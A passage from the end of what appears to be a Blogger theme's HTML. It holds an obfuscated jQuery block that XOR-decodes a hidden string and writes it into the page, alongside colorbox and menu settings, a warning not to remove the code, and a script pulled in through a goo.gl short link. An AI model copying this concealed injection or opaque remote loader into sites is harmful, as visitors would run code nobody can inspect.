D\x70\x6C\x65\x74\x65\x3A\x20\x63\x6F\x6C\x6F\x72\x62\x6F\x78\x20\x68\x61\x73\x20\x64\x69\x73\x70\x6C\x61\x79\x65\x64\x20\x74\x68\x65\x20\x6C\x6F\x61\x64\x65\x64\x20\x63\x6F\x6E\x74\x65\x6E\x74","\x6F\x6E\x43\x6C\x65\x61\x6E\x75\x70\x3A\x20\x63\x6F\x6C\x6F\x72\x62\x6F\x78\x20\x68\x61\x73\x20\x62\x65\x67\x75\x6E\x20\x74\x68\x65\x20\x63\x6C\x6F\x73\x65\x20\x70\x72\x6F\x63\x65\x73\x73","\x6F\x6E\x43\x6C\x6F\x73\x65\x64\x3A\x20\x63\x6F\x6C\x6F\x72\x62\x6F\x78\x20\x68\x61\x73\x20\x63\x6F\x6D\x70\x6C\x65\x74\x65\x6C\x79\x20\x63\x6C\x6F\x73\x65\x64","\x2E\x63\x61\x6C\x6C\x62\x61\x63\x6B\x73","\x67\x72\x6F\x75\x70\x35","\x2E\x6E\x6F\x6E\x2D\x72\x65\x74\x69\x6E\x61","\x2E\x72\x65\x74\x69\x6E\x61","\x4F\x70\x65\x6E\x20\x74\x68\x69\x73\x20\x77\x69\x6E\x64\x6F\x77\x20\x61\x67\x61\x69\x6E\x20\x61\x6E\x64\x20\x74\x68\x69\x73\x20\x6D\x65\x73\x73\x61\x67\x65\x20\x77\x69\x6C\x6C\x20\x73\x74\x69\x6C\x6C\x20\x62\x65\x20\x68\x65\x72\x65\x2E","\x74\x65\x78\x74","\x23\x66\x30\x30","\x23\x66\x66\x66","\x69\x6E\x68\x65\x72\x69\x74","\x63\x73\x73","\x23\x63\x6C\x69\x63\x6B","\x63\x6C\x69\x63\x6B","\x72\x65\x61\x64\x79","\x23\x70\x75\x6C\x6C","\x6E\x61\x76\x20\x75\x6C","\x68\x65\x69\x67\x68\x74","\x70\x72\x65\x76\x65\x6E\x74\x44\x65\x66\x61\x75\x6C\x74","\x73\x6C\x69\x64\x65\x54\x6F\x67\x67\x6C\x65","\x6F\x6E","\x77\x69\x64\x74\x68","\x3A\x68\x69\x64\x64\x65\x6E","\x69\x73","\x73\x74\x79\x6C\x65","\x72\x65\x6D\x6F\x76\x65\x41\x74\x74\x72","\x72\x65\x73\x69\x7A\x65"];var enkripsi=_0x8b51[0];teks=_0x8b51[1];teksasli=_0x8b51[1];var panjang;panjang=enkripsi[_0x8b51[2]];for(i=0;i<panjang;i++){teks+=String[_0x8b51[4]](enkripsi[_0x8b51[3]](i)^2);} ;teksasli=unescape(teks);document[_0x8b51[5]](teksasli);$(document)[_0x8b51[42]](function (){$(_0x8b51[8])[_0x8b51[7]]({rel:_0x8b51[6]});$(_0x8b51[11])[_0x8b51[7]]({rel:_0x8b51[9],transition:_0x8b51[10]});$(_0x8b51[15])[_0x8b51[7]]({rel:_0x8b51[12],transition:_0x8b51[13],width:_0x8b51[14],height:_0x8b51[14]});$(_0x8b51[17])[_0x8b51[7]]({rel:_0x8b51[16],slideshow:true});$(_0x8b51[18])[_0x8b51[7]]();$(_0x8b51[19])[_0x8b51[7]]({iframe:true,innerWidth:640,innerHeight:390});$(_0x8b51[20])[_0x8b51[7]]({iframe:true,innerWidth:500,innerHeight:409});$(_0x8b51[22])[_0x8b51[7]]({iframe:true,width:_0x8b51[21],height:_0x8b51[21]});$(_0x8b51[24])[_0x8b51[7]]({inline:true,width:_0x8b51[23]});$(_0x8b51[30])[_0x8b51[7]]({onOpen:function (){alert(_0x8b51[25]);} ,onLoad:function (){alert(_0x8b51[26]);} ,onComplete:function (){alert(_0x8b51[27]);} ,onCleanup:function (){alert(_0x8b51[28]);} ,onClosed:function (){alert(_0x8b51[29]);} });$(_0x8b51[32])[_0x8b51[7]]({rel:_0x8b51[31],transition:_0x8b51[13]});$(_0x8b51[33])[_0x8b51[7]]({rel:_0x8b51[31],transition:_0x8b51[13],retinaImage:true,retinaUrl:true});$(_0x8b51[40])[_0x8b51[41]](function (){$(_0x8b51[40])[_0x8b51[39]]({"\x62\x61\x63\x6B\x67\x72\x6F\x75\x6E\x64\x2D\x63\x6F\x6C\x6F\x72":_0x8b51[36],"\x63\x6F\x6C\x6F\x72":_0x8b51[37],"\x63\x75\x72\x73\x6F\x72":_0x8b51[38]})[_0x8b51[35]](_0x8b51[34]);return false;} );} );$(function (){var _0xde8dx3=$(_0x8b51[43]);menu=$(_0x8b51[44]);menuHeight=menu[_0x8b51[45]]();$(_0xde8dx3)[_0x8b51[48]](_0x8b51[41],function (_0xde8dx4){_0xde8dx4[_0x8b51[46]]();menu[_0x8b51[47]]();} );$(window)[_0x8b51[54]](function (){var _0xde8dx5=$(window)[_0x8b51[49]]();if(_0xde8dx5>320&&menu[_0x8b51[51]](_0x8b51[50])){menu[_0x8b51[53]](_0x8b51[52]);} ;} );} );
//]]></script>

<!-- DO NOT REMOVE ABOVE JAVASCRIPT CODES -->

<script style='text/javascript'>
//<![CDATA[
  //=====================================================

	var postperpage=5; // Number of Post to Show Per Page
	var upPageWord="Prev"; // Change Navigation Text
	var downPageWord="Next"; // Change Navigation Text

  //=====================================================
//]]>
var numshowpage=3; 
var home_page=&quot;/&quot;;
var urlactivepage=location.href;
</script><script src='http://goo.gl/vXvBVf'/>
</body>
</html>